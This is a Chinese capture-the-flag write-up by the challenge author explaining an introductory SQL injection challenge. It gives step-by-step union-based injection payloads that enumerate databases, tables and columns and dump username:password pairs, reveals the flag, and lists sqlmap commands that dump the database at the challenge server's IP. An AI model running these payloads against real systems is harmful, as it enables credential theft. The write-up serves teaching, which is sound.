## 来自本题出题人的wp

本题的sql注入没有设置任何的过滤，其实只是想让新手了解sql注入的原理，简直和我出的misc题一样简单！（如果你们有做不出的或觉得复杂的misc，那一定是diffany出的捏）

如果有下载本题释出的环境，可以看到压缩包中仅有的一个index.php，其中第36行的`SELECT * FROM users WHERE username='$username' AND password='$password'`即是需要利用的sql查询语句。想要复现的同学可以选择取消第37行的注释，你的输入将与该sql语句同时输出至前端，可以更清晰地看到你的输入对该语句产生了什么影响。

以下是手动注入的过程和说明，此处默认你已经掌握了一丢丢的sql知识。每步重点会**标粗**，每步的说明不一定很详细，建议可以看看[sqli-labs_04_less01补充基础知识](https://www.bilibili.com/video/BV1e441127Rd?p=4&vd_source=a69f1b8fb2369c8c358ded36e9abbc7d)，其实看完less01这三集，不看我的wp你也能直接做出来的。哦对，还是建议先做“ez_php_source”，毕竟我这题用的不是get传参，得先去那题学点知识，要是傻乎乎的在url后疯狂输出可不会有什么反应的哦

1. 首先可以随便输入点什么，看看网页输出发生了什么变化。比如用户名输入1，密码输入2，会发现输出了“用户: 1 不存在或密码错误！”。当然其实这不重要，重要的是如果你在**输入框内输入了一个单引号“ ' ”**，千万注意是英文的单引号，然后网页会返回“啊哦，出错了！”。恭喜你，你已经**造成了sql语句闭合的错误**了！至于为什么是单引号，反正闭合能用的符号就那几个，都试试就行，单引号是比较常见的，当然你也可以直接看源码，就知道我用的是单引号了

2. 既然用户名和密码的输入都能造成注入，那肯定选用户名下手了，至少我的输入不会变成黑色圆点。然后**输入`' order by 3 #`**返回“用户: ' order by 3 # 不存在或密码错误！”，**输入`' order by 4 #`**返回“啊哦，出错了！”，说明我们不能order by 4。先说一下这个order by是啥，这个一般用于输出时作为排序条件使用，具体可以自行查一查，不展开说明。这里只解释一下此处order by 4报错是因为当前的表（table）没有第四列（column），而order by 3没有报错，则说明当前表有第三列，**两个信息结合得出结论：当前表总共有三列**

3. 再接下来，我们想要看到admin的密码，作为有回显的sql注入，直接把想要的信息显示到网页上是个很方便的做法。注意到，当输入不构成报错时，网页上总会输出“用户：xxx”，那么是不是可以把信息输出到这里来呢。**输入`' union select 1,2,3 #`**，可以看到网页输出“用户：2 欢迎登录！”，说明**位置“2”是可以返回信息的**。union select和select基本就是一个东西，你也可以在mysql的命令行内试试下面输入的语句，可以看到输出大概长这样：

   ```
   MariaDB [ez_sql]> select * from ez_sql.users where username = '1' union select 1,2,3;
   +----+----------+----------+
   | id | username | password |
   +----+----------+----------+
   |  1 | 2        | 3        |
   +----+----------+----------+
   1 row in set (0.000 sec)
   ```

   此处使用本题的表做演示。当然，由于不存在username为1的数据，所以只显示成了这样

4. 既然“2”可以回显信息，那么我们就要在这里动手了。不过在此之前还有个问题，此题仅显示查询的第一行信息。比如你输入`admin' union select 1,2,3 #`，admin用户存在，网页输出了“用户：admin 欢迎登录！”，但如果你在mysql命令行执行，会得到如下结果：

   ```
   MariaDB [ez_sql]> select * from users where username = 'admin' union select 1,2,3;
   +----+----------+---------------------------+
   | id | username | password                  |
   +----+----------+---------------------------+
   |  8 | admin    | ROIS{sqli_1s_in7ere5ting} |
   |  1 | 2        | 3                         |
   +----+----------+---------------------------+
   2 rows in set (0.000 sec)
   ```
   
   存在第二行查询结果，却没有返回到网页显示。因此需要使用group_concat将所有结果放在同一行内，比如这样：
   
   ```
   # 使用前
   MariaDB [ez_sql]> select 1,2,3 from users;
   +---+---+---+
   | 1 | 2 | 3 |
   +---+---+---+
   | 1 | 2 | 3 |
   | 1 | 2 | 3 |
   | 1 | 2 | 3 |
   | 1 | 2 | 3 |
   | 1 | 2 | 3 |
   | 1 | 2 | 3 |
   | 1 | 2 | 3 |
   | 1 | 2 | 3 |
   +---+---+---+
   8 rows in set (0.000 sec)
   
   # 使用后
   MariaDB [ez_sql]> select 1,group_concat(2),3 from users;
   +---+-----------------+---+
   | 1 | group_concat(2) | 3 |
   +---+-----------------+---+
   | 1 | 2,2,2,2,2,2,2,2 | 3 |
   +---+-----------------+---+
   1 row in set (0.000 sec)
   ```
   
   所以使用group_concat可以将所有信息整合到一行来，这样我们就可以愉快地在网页输出上看到你所查到的信息了
   
   **查库名：`' union select 1,group_concat(schema_name),3 from information_schema.schemata #`**
   
   返回的信息中“ez_sql”即是本题的数据库
   
   **查表名：`' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='ez_sql' #`**
   
   返回的表仅有“users”，所以查这张表内的数据即可
   
   **查列名：`' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' #`**
   
   可能还会返回一些其他奇怪的东西，不过关键在于“username,password”这两列
   
   **查信息：`' union select 1,group_concat(concat_ws(':',username,password)),3 from ez_sql.users #`**
   
   这样会将所有的用户名和密码以“username:password”的形式输出出来，当然你也可以选择用其他的语句带出信息，比如使用不同的分隔符，比如只带出密码等等。根据本题说明，admin的密码就是flag啦

手注的教程告一段落，但我们还可以使用强大的工具sqlmap！鉴于本题传参使用post方式，那么设置好参数就可以一把梭啦。以下是使用sqlmap的命令，不对参数进行说明，遇到暂停需要选择y/n（yes or no）直接回车即可，感兴趣的可以自行尝试

1. 首先可以抓包或者hackbar看一下post的参数，例如用户名：1 密码：1的post参数显示是`username=1&password=1`，这样就够了
2. 查库名：`sqlmap -u http://101.43.57.52:28080/index.php --data='username=1&password=1' --dbs`
3. 查表名：`sqlmap -u http://101.43.57.52:28080/index.php --data='username=1&password=1' --tables -D ez_sql`
4. 输出全表：`sqlmap -u http://101.43.57.52:28080/index.php --data='username=1&password=1' --dump -D ez_sql -T users`

除了使用url和post，还可以在第一步抓包后将http请求包保存下来，比如保存为“http.txt”，然后将以上命令的`sqlmap -u http://101.43.57.52:28080/index.php --data='username=1&password=1'` 替换为 `sqlmap -r http.txt`，是不是命令缩短很多，说不定还有自动寻找其他注入点的神奇功效

